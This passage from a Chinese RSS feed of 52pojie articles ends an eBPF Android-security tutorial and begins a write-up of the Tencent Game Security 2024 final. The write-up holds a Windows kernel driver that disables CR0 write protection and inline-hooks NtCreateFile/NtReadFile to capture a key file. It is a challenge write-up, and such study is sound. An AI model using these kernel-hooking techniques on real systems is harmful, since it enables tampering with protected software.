0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">至于<code style="font-family: Consolas, Monaco, ;">kretprobe</code>，和<code style="font-family: Consolas, Monaco, ;">kprobe</code>区别不大，这里不在举例说明</span></p><h3>7.2 tracepoint</h3><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">tracepoint</code>可以理解为是在源码中预埋的hook点位，相比较<code style="font-family: Consolas, Monaco, ;">kprobe</code>，稳定性被大大增强，当然缺点也很明显，那就是数量有限，没办法自定义，查看所有<code style="font-family: Consolas, Monaco, ;">tracepoint</code>可在<code style="font-family: Consolas, Monaco, ;">/sys/kernel/tracing/events/</code>目录下找到所有可追踪的事件(PS: 有些机器可能是在<code style="font-family: Consolas, Monaco, ;">/sys/kernel/debug/tracing/events/</code>下)，事件的格式信息在相应的事件目录下的<code style="font-family: Consolas, Monaco, ;">format</code>文件中</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=510aea93&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6tnmGZXo5AJyM6VNBf4ctP845phhcVRoN6tGibX58OyxLibn9ibib2b6ibmQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=de0a5ec5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6O1hnCFN22fglKNo4JEUCEhvibrH2mRpVcibia6uOwQtt9LJjd1AXicxtDg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">内核层：</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">//go:build ignore</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"vmlinux.h"</span></span><br /><span style="color: rgb(255, 255, 182);">char</span> __license[] SEC(<span style="color: rgb(168, 255, 96);">"license"</span>) = <span style="color: rgb(168, 255, 96);">"GPL"</span>;<br /><span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">sys_enter_args</span> {<br />   <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">short</span> common_type;<br />   <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">char</span> common_flags;<br />   <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">char</span> common_preempt_count;<br />   <span style="color: rgb(255, 255, 182);">int</span> common_pid;<br />   <span style="color: rgb(255, 255, 182);">long</span> id;<br />   <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> args[<span style="color: rgb(255, 115, 253);">6</span>];};<br />SEC(<span style="color: rgb(168, 255, 96);">"tracepoint/raw_syscalls/sys_enter"</span>)<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">trace_sys_enter</span>(<span style="color: rgb(150, 203, 254);">struct</span> sys_enter_args *args){    u32 syscall_nr;    syscall_nr = args-&gt;id;<br />    bpf_printk(<span style="color: rgb(168, 255, 96);">"syscall_nr: %d"</span>,syscall_nr);<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">bpf_printk</code>函数打印的结果在<code style="font-family: Consolas, Monaco, ;">/sys/kernel/tracing/trace_pipe</code>文件中(PS:有些机型在<code style="font-family: Consolas, Monaco, ;">/sys/kernel/debug/tracing/trace_pipe</code>文件中，下同，下面的不在重复解释)，观看<code style="font-family: Consolas, Monaco, ;">bpf_printk</code>函数结果需要先将<code style="font-family: Consolas, Monaco, ;">/sys/kernel/tracing/tracing_on</code>文件中的值置为<code style="font-family: Consolas, Monaco, ;">1</code></span></p><p><span style="font-weight: 700;">用户层：</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">package</span> main<br /><span style="color: rgb(150, 203, 254);">import</span> (<br />    <span style="color: rgb(168, 255, 96);">"log"</span><br />    <span style="color: rgb(168, 255, 96);">"time"</span><br />    <span style="color: rgb(168, 255, 96);">"github.com/cilium/ebpf/link"</span><br />    <span style="color: rgb(168, 255, 96);">"github.com/cilium/ebpf/rlimit"</span>)<br /><span style="color: rgb(146, 255, 184);">//go:generate go run github.com/cilium/ebpf/cmd/bpf2go --target=amd64 bpf blog.c -- -I./headers</span><br /><span style="color: rgb(150, 203, 254);">func</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />    <span style="color: rgb(150, 203, 254);">if</span> err := rlimit.RemoveMemlock(); err != <span style="color: rgb(198, 197, 254);">nil</span> {        log.Fatal(err)    }    objs := bpfObjects{}<br />    <span style="color: rgb(150, 203, 254);">if</span> err := loadBpfObjects(&amp;objs, <span style="color: rgb(198, 197, 254);">nil</span>); err != <span style="color: rgb(198, 197, 254);">nil</span> {<br />        log.Fatalf(<span style="color: rgb(168, 255, 96);">"loading objects: %v"</span>, err)    }<br />    <span style="color: rgb(150, 203, 254);">defer</span> objs.Close()<br />    kp, err := link.Tracepoint(<span style="color: rgb(168, 255, 96);">"raw_syscalls"</span>,<span style="color: rgb(168, 255, 96);">"sys_enter"</span>,objs.TraceSysEnter,<span style="color: rgb(198, 197, 254);">nil</span>)<br />        <span style="color: rgb(150, 203, 254);">if</span> err != <span style="color: rgb(198, 197, 254);">nil</span> {            log.Fatal(err)        }<br />        <span style="color: rgb(150, 203, 254);">defer</span> kp.Close()<br />    ticker := time.NewTicker(<span style="color: rgb(255, 115, 253);">1</span> * time.Minute)<br />    <span style="color: rgb(150, 203, 254);">defer</span> ticker.Stop()<br />    log.Println(<span style="color: rgb(168, 255, 96);">"Waiting for events.."</span>)<br />    <span style="color: rgb(150, 203, 254);">for</span> <span style="color: rgb(150, 203, 254);">range</span> ticker.C {<br />        log.Printf(<span style="color: rgb(168, 255, 96);">"get rule\n"</span>)        }<br />}</code></pre><p><span style="font-weight: 700;">效果图如下：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ea072267&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6ibib0bGnQqNPfSuqaylhic2MfUwDUib5bOhFZ61ZA8nN8fS0feXCZjaJpg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><h3>7.3 其他事件类型</h3><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">ebpf</code>还有其他事件类型，例如<code style="font-family: Consolas, Monaco, ;">socket</code>、<code style="font-family: Consolas, Monaco, ;">sockops</code>、<code style="font-family: Consolas, Monaco, ;">tc</code>、<code style="font-family: Consolas, Monaco, ;">xdp</code>等等，但这些更多与流量控制息息相关，跟我们在移动安全上的关联性不是很大，这里不在举例说明，当然还有<code style="font-family: Consolas, Monaco, ;">uprobe</code>事件类型，这个是用户层插桩的，但用户层插桩更推荐<code style="font-family: Consolas, Monaco, ;">frida</code>这些框架，而且<code style="font-family: Consolas, Monaco, ;">uprobe</code>在<code style="font-family: Consolas, Monaco, ;">linux</code>使用体验感还好，在<code style="font-family: Consolas, Monaco, ;">Android</code>端使用去插桩<code style="font-family: Consolas, Monaco, ;">APP</code>过于麻烦了。</span></p><hr /><h2>八、一些使用技巧</h2><h3>8.1 将数据从用户空间传输到内核空间</h3><p><span style="font-weight: 700;">在<code style="font-family: Consolas, Monaco, ;">cilium</code>中，<code style="font-family: Consolas, Monaco, ;">ringbuffer</code>并不支持将数据从用户空间传递到内核空间，只支持将数据从内核空间发送到用户空间，在新的数据传输框架<code style="font-family: Consolas, Monaco, ;">BPF_MAP_TYPE_USER_RINGBUF</code>支持将数据从用户空间传输到内核空间，但是遗憾的是，<code style="font-family: Consolas, Monaco, ;">cilium</code>暂不支持该框架</span></p><p><span style="font-weight: 700;">在我们需要传输一些过滤条件或者动态的全局配置到内核层去过滤的时候需要怎么做喃？可以考虑监控特定的文件名、特定的命令等来获取数据，当然这种方式仅时候传递数据量不大的情况</span></p><h3>8.2 获取UID</h3><p><span style="font-weight: 700;">UID是啥，UID是android中uid用于标识一个应用程序，uid在应用安装时被分配，并且在应用存在于手机上期间，都不会改变，可以理解为app的唯一身份标识，在ebpf中，可以用来过滤指定app的数据</span></p><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">ebpf</code>可以使用<code style="font-family: Consolas, Monaco, ;">bpf_get_current_uid_gid</code>函数来获取UID，该函数返回值为<code style="font-family: Consolas, Monaco, ;">u32</code>类型</span></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1917339-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Thu, 25 Apr 2024 17:40:52 +0800</pubDate>
</item>
<item>
<title>腾讯游戏安全大赛2024决赛题解</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140550&amp;idx=1&amp;sn=06032f42320c27348461d54fce62318a&amp;chksm=bd50a1928a2728843f062d140281a3622ab175a86c46d574bd10578b7695b36fb8726bad4357&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140550&amp;idx=1&amp;sn=06032f42320c27348461d54fce62318a&amp;chksm=bd50a1928a2728843f062d140281a3622ab175a86c46d574bd10578b7695b36fb8726bad4357&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-04-22 12:41</span> <span style="display: inline-block;">北京</span>
</p>

<p>决赛打五天，是真的顶级，但是五天比一年学的东西都多...</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=8920be6b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJGm1gHNVCkMxj4OPtnDUeP2EOdRxCtUBTPW80kNtxhdquBfUIyAicypdHyAc051yGk2gRCKN7wVrg%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>xia0ji233</strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p>决赛打五天，是真的顶级，但是五天比一年学的东西都多...</p><p>本题解题附件自取</p><p>&lt;!--more--&gt;</p><h2>2024腾讯游戏安全竞赛决赛题解</h2><h3>分析</h3><h4>自行加载loader.sys, 找到用户名为administrator的KEY，作为答案提交（1分）</h4><p>Key 和 User 默认读 <code style="font-family: SFMono-Regular, Consolas, ;">C:\card.txt</code>，如果找不到或者是错误，那么加载会失败，于是想到 hook NtCreateFile 获取到文件句柄，再 hook NtReadFile 找到文件内容写入的地址。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntifs.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntdef.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntstatus.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;ntddk.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_BACKTRACE_DEPTH 20</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> SYMBOL <span style="color: rgb(168, 255, 96);">L"\\??\\xia0ji2333"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span><br />UINT64 BaseAddr=<span style="color: rgb(198, 197, 254);">NULL</span>, DLLSize=<span style="color: rgb(255, 115, 253);">0</span>;<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">DeleteDevice</span>(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start delete device\n"</span>), __LINE__);<br />    <span style="color: rgb(150, 203, 254);">if</span> (pDriver-&gt;DeviceObject) {        UNICODE_STRING Sym;<br />        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span style="color: rgb(146, 255, 184);">//CreateFile </span><br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Symbol\n"</span>), __LINE__);        IoDeleteSymbolicLink(&amp;Sym);<br />        kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: Delete Device\n"</span>), __LINE__);        IoDeleteDevice(pDriver-&gt;DeviceObject);    }<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: end delete device\n"</span>), __LINE__);}<br />HANDLE FileHandler = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(255, 255, 182);">char</span> newcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(146, 255, 184);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span><span style="color: rgb(146, 255, 184);">//jmp rax</span>};<br /><span style="color: rgb(255, 255, 182);">char</span> oldcode[] = {<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,};<br /><span style="color: rgb(255, 255, 182);">char</span> newcode2[] = {<br />    <span style="color: rgb(255, 115, 253);">0x48</span>,<span style="color: rgb(255, 115, 253);">0xB8</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(146, 255, 184);">//mov rax,xxx</span><br />    <span style="color: rgb(255, 115, 253);">0xFF</span>,<span style="color: rgb(255, 115, 253);">0xE0</span><span style="color: rgb(146, 255, 184);">//jmp rax</span>};<br /><span style="color: rgb(255, 255, 182);">char</span> oldcode2[] = {<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,<br />    <span style="color: rgb(255, 115, 253);">0x00</span>,<span style="color: rgb(255, 115, 253);">0x00</span>,};<br /><span style="color: rgb(255, 255, 182);">char</span>* target;<br /><span style="color: rgb(255, 255, 182);">char</span>* target2;<br />KIRQL <span style="color: rgb(255, 255, 182);">WPOFFx64</span>(){    KIRQL irql = KeRaiseIrqlToDpcLevel();    UINT64 cr0 = __readcr0();<br />    cr0 &amp;= <span style="color: rgb(255, 115, 253);">0xfffffffffffeffff</span>;    __writecr0(cr0);    _disable();<br />    <span style="color: rgb(150, 203, 254);">return</span> irql;}<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">WPONx64</span>(KIRQL irql){    UINT64 cr0 = __readcr0();<br />    cr0 |= <span style="color: rgb(255, 115, 253);">0x10000</span>;    _enable();    __writecr0(cr0);    KeLowerIrql(irql);}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">Unhook</span>() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(newcode); i++) {        target[i] = oldcode[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">Unhook2</span>() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(newcode2); i++) {        target2[i] = oldcode2[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">Hook</span>() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(newcode); i++) {        target[i] = newcode[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">Hook2</span>() {    KIRQL irql = WPOFFx64();<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; sizeof(newcode2); i++) {        target2[i] = newcode2[i];    }    WPONx64(irql);<br />    <span style="color: rgb(150, 203, 254);">return</span> STATUS_SUCCESS;}<br />PDRIVER_OBJECT g_Object = <span style="color: rgb(198, 197, 254);">NULL</span>;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">_LDR_DATA_TABLE_ENTRY</span> {    LIST_ENTRY InLoadOrderLinks;    LIST_ENTRY InMemoryOrderLinks;    LIST_ENTRY InInitializationOrderLinks;    PVOID DllBase;<br />    PVOID EntryPoint;<span style="color: rgb(146, 255, 184);">//驱动的进入点 DriverEntry  </span>    ULONG SizeOfImage;<br />    UNICODE_STRING FullDllName;<span style="color: rgb(146, 255, 184);">//驱动的满路径  </span><br />    UNICODE_STRING BaseDllName;<span style="color: rgb(146, 255, 184);">//不带路径的驱动名字  </span>    ULONG Flags;    USHORT LoadCount;    USHORT TlsIndex;<br />    <span style="color: rgb(150, 203, 254);">union</span> {        LIST_ENTRY HashLinks;<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            PVOID SectionPointer;            ULONG CheckSum;        };    };<br />    <span style="color: rgb(150, 203, 254);">union</span> {<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            ULONG TimeDateStamp;        };<br />        <span style="color: rgb(150, 203, 254);">struct</span> {            PVOID LoadedImports;        };    };} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (* FuncPtr) (    _Out_ PHANDLE FileHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _Out_ PIO_STATUS_BLOCK IoStatusBlock,    _In_opt_ PLARGE_INTEGER AllocationSize,    _In_ ULONG FileAttributes,    _In_ ULONG ShareAccess,    _In_ ULONG CreateDisposition,    _In_ ULONG CreateOptions,    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,    _In_ ULONG EaLength    );<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">NTSTATUS</span> (* FuncPtr2 )(    _In_ HANDLE FileHandle,    _In_opt_ HANDLE Event,    _In_opt_ PIO_APC_ROUTINE ApcRoutine,    _In_opt_ PVOID ApcContext,    _Out_ PIO_STATUS_BLOCK IoStatusBlock,    _Out_writes_bytes_(Length) PVOID Buffer,    _In_ ULONG Length,    _In_opt_ PLARGE_INTEGER ByteOffset,    _In_opt_ PULONG Key    );<br />ULONG  <span style="color: rgb(255, 255, 182);">myCreateFile</span>(_Out_ PHANDLE FileHandle,    _In_ ACCESS_MASK DesiredAccess,    _In_ POBJECT_ATTRIBUTES ObjectAttributes,    _Out_ PIO_STATUS_BLOCK IoStatusBlock,    _In_opt_ PLARGE_INTEGER AllocationSize,    _In_ ULONG FileAttributes,    _In_ ULONG ShareAccess,    _In_ ULONG CreateDisposition,    _In_ ULONG CreateOptions,    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,    _In_ ULONG EaLength) {    Unhook();    FuncPtr func = (FuncPtr)target;    NTSTATUS s = func(FileHandle,DesiredAccess,ObjectAttributes,IoStatusBlock,AllocationSize,FileAttributes,ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);<br />    <span style="color: rgb(150, 203, 254);">if</span> (!wcscmp(ObjectAttributes-&gt;ObjectName-&gt;Buffer, <span style="color: rgb(168, 255, 96);">L"\\??\\C:\\card.txt"</span>)) {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"call NtCreateFile(%p,%p,%S,%p,%p,%p,%p,%p,%p,%p,%p)\n"</span>), FileHandle,DesiredAccess,ObjectAttributes-&gt;ObjectName-&gt;Buffer,IoStatusBlock,AllocationSize,FileAttributes,ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);        DbgBreakPoint();        FileHandler = *FileHandle;    }<br />    <span style="color: rgb(146, 255, 184);">//DbgBreakPoint();</span>    Hook();<br />    <span style="color: rgb(150, 203, 254);">return</span> s;}<br />ULONG <span style="color: rgb(255, 255, 182);">myReadFile</span>(    _In_ HANDLE FileHandle,    _In_opt_ HANDLE Event,    _In_opt_ PIO_APC_ROUTINE ApcRoutine,    _In_opt_ PVOID ApcContext,    _Out_ PIO_STATUS_BLOCK IoStatusBlock,    _Out_writes_bytes_(Length) PVOID Buffer,    _In_ ULONG Length,    _In_opt_ PLARGE_INTEGER ByteOffset,    _In_opt_ PULONG Key) {    Unhook2();    FuncPtr2 func = (FuncPtr2)target2;<br />    <span style="color: rgb(150, 203, 254);">if</span> (FileHandler &amp;&amp; FileHandler == FileHandle) {<br />        kprintf((<span style="color: rgb(168, 255, 96);">"call NtReadFile(%p,%p,%p,%p,%p,%p,%p,%p,%p)\n"</span>), FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);        DbgBreakPoint();<br />        FileHandler = <span style="color: rgb(255, 115, 253);">0</span>;    }<br />    <span style="color: rgb(146, 255, 184);">//DbgBreakPoint();</span>    NTSTATUS s = func(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,Buffer,Length,ByteOffset,Key);    Hook2();<br />    <span style="color: rgb(150, 203, 254);">return</span> s;}<br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">DriverUnload</span>(PDRIVER_OBJECT pDriver) {<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: start unload\n"</span>), __LINE__);    Unhook();    Unhook2();    DeleteDevice(pDriver);}<br />NTSTATUS <span style="color: rgb(255, 255, 182);">DriverEntry</span>(    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {    DriverObject-&gt;DriverUnload = DriverUnload;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line %d:xia0ji233: RegistryPath = %S\n"</span>), __LINE__, RegistryPath-&gt;Buffer);    target = NtCreateFile;    target2 = NtReadFile;<br />    kprintf((<span style="color: rgb(168, 255, 96);">"Line 